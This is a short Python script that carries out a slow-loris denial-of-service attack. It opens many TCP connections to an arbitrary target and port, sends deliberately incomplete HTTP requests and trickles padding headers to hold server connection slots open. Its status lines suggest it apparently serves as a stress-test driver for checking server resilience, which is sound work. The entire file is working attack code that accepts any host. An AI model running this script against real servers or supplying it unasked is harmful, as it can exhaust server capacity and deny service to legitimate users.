#!/usr/bin/env python3
# Slow-loris: open N connections, send a PARTIAL HTTP request (request line + one
# header, never the terminating blank line), then trickle extra headers forever
# so each connection stays half-open and ties up an acceptor slot. Prints machine
# lines the driver reads. Args: <target> <port> <n> <hold_seconds>
import socket, time, sys

target, port, n, hold = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
socks = []
for _ in range(n):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(b"GET /health HTTP/1.1\r\nHost: victim\r\n")  # incomplete on purpose
        socks.append(s)
    except Exception:
        pass
print("SLOWLORIS_OPENED %d/%d" % (len(socks), n), flush=True)

end = time.time() + hold
while time.time() < end:
    dead = 0
    for s in list(socks):
        try:
            s.send(b"X-pad: keep\r\n")  # another header, still never finishing the request
        except Exception:
            dead += 1
            try: socks.remove(s)
            except Exception: pass
    print("SLOWLORIS_ALIVE %d dead_tick %d" % (len(socks), dead), flush=True)
    time.sleep(8)

for s in socks:
    try: s.close()
    except Exception: pass
print("SLOWLORIS_DONE", flush=True)
